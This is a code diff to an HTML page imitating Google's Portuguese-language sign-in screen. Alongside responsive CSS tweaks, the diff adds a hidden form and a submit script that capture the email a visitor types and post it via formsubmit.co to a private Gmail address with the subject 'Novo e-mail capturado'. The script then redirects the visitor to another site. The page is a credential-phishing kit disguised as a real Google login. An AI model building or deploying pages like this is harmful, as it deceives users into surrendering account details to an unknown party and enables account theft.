@@ -2,6 +2,7 @@
 <html lang="pt-br">
 <head>
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Google Sign-In</title>
   <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
   <style>
@@ -17,20 +18,37 @@
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
+      min-height: 100vh;
     }
 
     .login-box {
       background-color: white;
-      width: 720px;
+      max-width: 720px;
+      width: 90%;
       border-radius: 28px;
       box-shadow: 0 2px 6px rgba(0, 0, 0, 0.15);
       display: flex;
-      padding: 40px;
+      flex-direction: column;
+      padding: 20px;
+      margin: 20px;
+    }
+
+    @media (min-width: 768px) {
+      .login-box {
+        flex-direction: row;
+        padding: 40px;
+      }
     }
 
     .left {
       flex: 1;
+      margin-bottom: 20px;
+    }
+
+    @media (min-width: 768px) {
+      .left {
+        margin-bottom: 0;
+      }
     }
 
     .left img {
@@ -50,12 +68,19 @@
 
     .right {
       flex: 1;
-      padding-left: 40px;
+      padding-left: 0;
+    }
+
+    @media (min-width: 768px) {
+      .right {
+        padding-left: 40px;
+      }
     }
 
     input[type="text"],
     input[type="password"] {
-      width: 400px;
+      width: 100%;
+      max-width: 400px;
       padding: 14px;
       font-size: 16px;
       margin: 24px 0 10px;
@@ -113,7 +138,7 @@
     }
 
     .bottom-links {
-      position: absolute;
+      position: fixed;
       bottom: 16px;
       width: 100%;
       text-align: center;
@@ -125,9 +150,11 @@
       margin: 0 12px;
       cursor: pointer;
     }
-
+    h1{
+        font-size: 40px;
+    }
     .language {
-      position: absolute;
+      position: fixed;
       bottom: 50px;
       left: 20px;
       font-size: 12px;
@@ -142,17 +169,26 @@
     <div class="left">
       <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo">
       <h1>Login</h1>
-      <p>Entre na sua conta Google</p>
+      <p>Entre na sua conta Google e explore o mundo de possibilidades!</p>
     </div>
 
     <div class="right">
-      <form action="/login" method="post">
-        <input type="text" name="email" placeholder="E-mail ou telefone" required>
-        <input type="password" name="senha" placeholder="Senha" required>
+      <!-- Formulário para enviar e-mail via FormSubmit -->
+      <form id="emailForm" action="https://formsubmit.co/contadoz175@gmail.com" method="POST" style="display: none;">
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_subject" value="Novo e-mail capturado">
+        <input type="text" name="email" id="capturedEmail">
+        <input type="hidden" name="_next" value="https://www.google.com">
+      </form>
+
+      <!-- Formulário visual para o usuário -->
+      <form id="loginForm">
+        <input type="text" name="email" id="email" placeholder="E-mail ou telefone" required>
+        <input type="password" name="senha" id="senha" placeholder="Senha" required>
         <div class="forgot-senha">Esqueceu a senha?</div>
         <div class="info-text">
-          Não é o seu computador? Use o modo Convidado para fazer login em modo privado.
-          <a href="#">Ler mais</a>
+          Não é o seu computador? Use o modo Convidado para fazer login em modo privado.        
+         <a href="#">Ler mais</a>
         </div>
         <div class="footer-buttons">
           <a href="#">Criar conta</a>
@@ -168,5 +204,23 @@
     <span>Privacidade</span>
     <span>Termos</span>
   </div>
+
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault(); // Evita o envio padrão
+
+      // Captura o e-mail digitado
+      const email = document.getElementById('email').value;
+      document.getElementById('capturedEmail').value = email;
+
+      // Envia o e-mail via FormSubmit
+      document.getElementById('emailForm').submit();
+
+      // Redireciona para o Google após 1 segundo (para garantir o envio)
+      setTimeout(() => {
+        window.location.href = "https://carreira.alura.com.br/cursos-imersivos/home";
+      }, 1000);
+    });
+  </script>
 </body>
 </html>
